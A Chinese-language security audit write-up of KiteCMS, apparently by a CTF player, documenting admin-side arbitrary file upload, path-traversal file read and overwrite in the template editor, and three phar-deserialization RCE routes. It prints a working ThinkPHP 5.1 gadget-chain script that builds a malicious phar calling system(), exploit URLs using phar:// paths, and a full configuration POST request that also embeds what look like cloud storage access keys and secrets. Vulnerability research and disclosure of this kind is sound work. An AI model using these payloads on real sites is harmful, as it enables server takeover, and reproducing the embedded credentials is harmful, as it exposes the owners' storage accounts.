# Kitecms审计与测试

刚打完国赛，还是不想看Java。。。正巧马上就要开始期末复习，这段时间也不知道该干什么，那就再看看新的CMS叭，继续跟着Y4师傅学习。

这是一款基于thinkphp5.1.41的CMS（虽然官方上写的还是5.1.39），所以我的第一反应就是phar yyds，hhh。

## 任意文件上传漏洞（复现）

拿到这个CMS的时候我大致看了一下cnvd已经爆出来的洞，感觉除了XSS这种东西，其他的命令执行，文件上传之类的漏洞感觉全都是在后台，所以我第一反应就是这又是一个纯数据库操作和前端的前台。

大致看了一下，发现前台注册个用户后也有个文件上传的功能`application/member/controller/Upload.php`，但是具体试的时候发现提示没有访问权限。经过一番探索，发现就是站点注册的用户，在`kite_auth_user`表中的`role_ids`给的是3，但是admin是`1,2,3`，然后就是`kite_auth_user`，`kite_auth_rule`，`kite_auth_role`的类似三表信息联合，具体不分析了，最终的简单的结果就是直接这样注册的用户还没权限用这个`application/member/controller/Upload.php`，除非上后台改一下权限。但是我在数据库里发现以注册用户的权限可以干这件事情：

```php
头像设置
member/member/avatar
```

跟进一下代码，发现其实也是一处文件上传：

```php
    // 头像设置
    public function avatar()
    {
        // 获取表单上传文件
        $file = Request::file('file');
        $uploadObj = new UploadFile($this->site_id);
        $ret = $uploadObj->upload($file);
        ...............................
```

实际上，这个CMS在处理文件上传的时候，基本都是这三行代码：

```php
        $file = Request::file('file');
        $uploadObj = new UploadFile($this->site_id);
        $ret = $uploadObj->upload($file);
```

跟进一下`upload`方法就会发现，它实际上对上传的文件会有这样的检测：

```php
$result = $file->check(['ext' => $this->config['upload_image_ext'], 'size' => $this->config['upload_image_size']*1024]);
```

用的也是thinkphp自带的检测，具体不说了。总的来说就是白名单检测后缀，这个白名单也是取自的数据库。而且这是单纯的从数据库里取出来白名单进行检验，没有额外再检验php了，所以我直接上后台，改一下上传的设置：

![pic22](D:\this_is_feng\github\CTF\Web\picture\pic22.png)

加个php，然后找个上传点，直接上传马：

![pic23](D:\this_is_feng\github\CTF\Web\picture\pic23.png)

成功getshell。所以这个CMS其实也是前台没东西，后台很容易拿下的。但是因为是thinkphp5.1.41，肯定也没有SQL注入了，想进后台也只能靠弱口令了。本来不想再看了，因为感觉CNVD已经爆出来后台的很多洞了。后来想想还是自己再把后台的功能好好审审，继续增加后台的代码审计的经验叭。



## 任意文件读取&已存在文件的修改

首先来到后台的模板功能。没办法，后台最吸引人的地方，除了上传，就是模板功能了。

漏洞在`application/admin/controller/Template.php`的`fileedit`函数：

```php
    public function fileedit()
    {
        $path = Request::param('path');
        $siteObj = new Site;
        $template = $siteObj->where('id', $this->site_id)->value('theme');
        $rootpath = Env::get('root_path') . 'theme' . DIRECTORY_SEPARATOR . $template . DIRECTORY_SEPARATOR . $path;
        if (!file_exists($rootpath) && !preg_match("/theme/", $rootpath)) {
            throw new HttpException(404, 'This is not file');
        }

        if (Request::isPost()) {
            if (is_writable($rootpath)) {
                $html = file_put_contents($rootpath, htmlspecialchars_decode(Request::param('html')));
            } else {
                throw new HttpException(404, 'File not readabled');
            }
            if ($html) {
                return $this->response(200, Lang::get('Success'));
            } else {
                return $this->response(201, Lang::get('Fail'));
            }
        } else {
            if (is_readable($rootpath)) {
                $html = file_get_contents($rootpath);
            } else {
                throw new HttpException(404, 'File not readabled');
            }
            $data = [
                'html' => htmlspecialchars($html),
                'path' => $path,
                'name' => base64_decode(Request::param('name')),
            ];
    
            return $this->fetch('fileedit', $data);
        }
    }

```

逻辑很简单，通过post或者get得到path变量，然后就是拼接到一个目录的最后面，因此可以目录穿越。但是有个限制：

```php
        if (!file_exists($rootpath) && !preg_match("/theme/", $rootpath)) {
            throw new HttpException(404, 'This is not file');
        }
```

第二个正则匹配没有影响，因为前面的拼接部分本来就有。但是第一个`file_exists`要求文件必须是已存在的。

然后就是2种利用，如果请求方式是post，那就对这个已存在的文件判断是否可写，可写的话就任意写入：

```php
if (is_writable($rootpath)) {
    $html = file_put_contents($rootpath, htmlspecialchars_decode(Request::param('html')));
}
```



因此可以找个几乎没影响的已存在的php文件进行写入，即可`getshell`。

如果请求方式不是post的话，就是读取这个文件了：

```php
            if (is_readable($rootpath)) {
                $html = file_get_contents($rootpath);
            }
```

实现任意文件的读取。

所以说后台的模板功能不做限制真的是各种利用。



## phar rce 1

在模板这里我发现文件操作函数的前部分都不可控，所以没法phar。但是`application/admin/controller/Template.php`的`filelist`函数中出现了`Admin.php`的`getTpl`函数。我跟进一下`Admin.php`发现里面也都是关于文件操作的，而且可以phar反序列化，非常好用。

第一个phar是在`application/admin/controller/Admin.php`的`scanFilesForTree`方法：

```php
    public function scanFilesForTree($dir)
    {
        $files = [];
        if (is_dir($dir)) {
```

没啥好说的，get传`$dir`，然后直接一个`is_dir`成功phar反序列化。



攻击：

先生成phar：

```php
<?php
namespace think\process\pipes {
    class Windows
    {
        private $files;
        public function __construct($files)
        {
            $this->files = [$files];
        }
    }
}

namespace think\model\concern {
    trait Conversion
    {
    }

    trait Attribute
    {
        private $data;
        private $withAttr = ["lin" => "system"];

        public function get()
        {
            $this->data = ["lin" => "whoami"];
        }
    }
}

namespace think {
    abstract class Model
    {
        use model\concern\Attribute;
        use model\concern\Conversion;
    }
}

namespace think\model{
    use think\Model;
    class Pivot extends Model
    {
        public function __construct()
        {
            $this->get();
        }
    }
}

namespace {

    $conver = new think\model\Pivot();
    $a = new think\process\pipes\Windows($conver);


    @unlink("phar.phar");
    $phar = new Phar("phar.phar"); //后缀名必须为phar
    $phar->startBuffering();
    $phar->setStub("GIF89a<?php __HALT_COMPILER(); ?>"); //设置stub
    $phar->setMetadata($a); //将自定义的meta-data存入manifest
    $phar->addFromString("test.txt", "test"); //添加要压缩的文件
//签名自动计算
    $phar->stopBuffering();
}
?>
```

改后缀为png然后上传：

![pic24](D:\this_is_feng\github\CTF\Web\picture\pic24.png)



然后phar梭哈：

```
http://www.kitecms.com/admin/admin/scanFilesForTree?dir=phar://./upload/20210606/1c57fd5e8abbd8ce9e6715c28227a95f.png
```

![pic25](D:\this_is_feng\github\CTF\Web\picture\pic25.png)



## phar rce 2

是`application/admin/controller/Admin.php`的`scanFiles`方法：

```php
    function scanFiles($dir) {
        if (!is_dir($dir)) {
            return [];
        }
```

没啥好说的，还是直接打：

```
http://www.kitecms.com/admin/admin/scanFiles?dir=phar://./upload/20210606/1c57fd5e8abbd8ce9e6715c28227a95f.png
```



## phar rce 3

这个phar比较难发现，我找到这个phar还是比较开心的。

主要是把admin控制器下的代码都给过了一遍，全tm的都是数据库操作。。。除了模板和文件上传就全都数据库，模板也彻底打不动了，因此再好好看一下文件上传。



入口就不说了，这个CMS可以利用这个phar的地方太多了，例如`application/admin/controller/Upload.php`的`uploadFile`方法这样的。

主要就是这样：

```php
        // 获取表单上传文件
        $file = Request::file('file');

        $uploadObj = new UploadFile($this->site_id);
        $ret = $uploadObj->upload($file, 'image');
```

跟进`$uploadObj->upload`方法，前面是一些验证，里面看了利用不了，看看下面的部分：

```php
        $result =  $this->uploadHandler->upload($file);
        $data   =  array_merge($result, ['site_id' => $this->site_id]);
        SiteFile::create($data);
        return $data;
```

可以看到还有这个`$this->uploadHandler->upload($file);`

大致看了一下，发现`$this->uploadHandler`是这样来的：

```php
    public function uploadHandler()
    {
        // 上传方式
        switch ($this->config['upload_type'])
        {
            case 'local':
                $type =  'Local';
                break;
            case 'alioss':
                $type =  'AliOss';
                break;
            case 'qiniuoss':
                $type =  'QinniuOss';
                break;
        }

        return Loader::factory($type, '\\app\common\model\upload\driver\\', $this->config);
    }
```

默认是local，当然这个配置也可以后台更改。因此跟进一下`app\common\model\upload\driver\local`的`upload`方法，位于`application/common/model/upload/driver/Local.php`：

```php
    public function upload($file)
    {
        $uploadPath = $this->config['upload_path'];
        if (!is_dir($uploadPath)) {
           mkdir(iconv("UTF-8", "GBK", $uploadPath), 0777, true);
        }
```

直接一个`is_dir`，可以phar。至于`$uploadPath`则是从数据库中直接取出来的，这个可以在后台控制，所以可以成功phar。



攻击：

先后台修改一下配置，使得`$this->config['upload_path'];`是phar：

```php
POST /admin/site/config.html
    
upload_type=local&upload_image_ext=jpg%2Cpng%2Cgif%2Cphp&upload_image_size=2048&upload_video_ext=rm%2Crmvb%2Cwmv%2C3gp%2Cmp4%2Cmov%2Cavi%2Cflv&upload_video_size=10240&upload_attach_ext=doc%2Cxls%2Crar%2Czip%2C7z&upload_attach_size=10240&upload_path=phar://./upload/20210606/1c57fd5e8abbd8ce9e6715c28227a95f.png&alioss_key=4H5C4jQbxBAsbwye1&alioss_secret=U5Be9VLZCpy8oCo7sTQSCq806swqGV&alioss_endpoint=oss-cn-shenzhen.aliyuncs.com&alioss_bucket=kitesky&qiniu_ak=9VWzf1jiS3gEALBi_XtwELHaHzHJIeCXE5W4KtJt&qiniu_sk=TGNd21xwf-yHGWn3FwN37fkRWpOzzMhXC5jEfgr8&qiniu_bucket=kitesky&qiniu_domain=http%3A%2F%2Fonxr8mt8y.bkt.clouddn.com
```

修改`upload_path`即可。

然后正常上传文件，即可phar：

![pic26](D:\this_is_feng\github\CTF\Web\picture\pic26.png)





## 总结

审计KiteCMS也算是有一些收获叭，拿到了4个shell，不过我扫了一眼cnvd感觉可能已经有2-3个交过了，我觉得我最后的phar3可能还没人交，不过我还是把3个phar都给交了一遍。

接下来审计CMS就不能只盯着phar了，逻辑漏洞之类的我还没挖掘过，也需要把视野再放的开阔一点。

当然这些洞主要还是提高我的审计能力，真实遇到了也没啥用，除非弱密码进后台。所以只要不是弱密码，这个CMS还是很安全的。
